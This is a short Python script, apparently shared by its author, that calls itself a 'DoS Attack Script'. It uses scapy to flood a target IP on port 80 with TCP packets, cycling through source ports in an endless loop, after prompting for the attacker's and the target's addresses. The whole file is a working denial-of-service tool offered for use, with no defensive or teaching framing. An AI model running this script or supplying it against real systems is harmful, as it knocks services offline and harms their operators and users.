import os
os.system('clear')
import scapy.all
from scapy.all import *
import termcolor
import pyfiglet

Dos = pyfiglet.figlet_format("Dos Attack\nScript")
print(termcolor.colored(Dos, color = 'red'))
print(" ")
link = "\t\thttps://instagram.com/mostafa_elguerdawi"

print(termcolor.colored(link, color = 'green'))

print(" ")

IP_Hack = input("Enter Your IP >> ")
IP_Target = input("Enter Target IP >> ")

i = 1

while True:
	for port in range(1, 5000):
		
		IP1 = IP(src = IP_Hack, dst = IP_Target)
		TCP1 =TCP(sport = port, dport = 80)
		paket = IP1 / TCP1
		
		send(paket, inter = .001)
		print("Packet sent", i)
	i += 1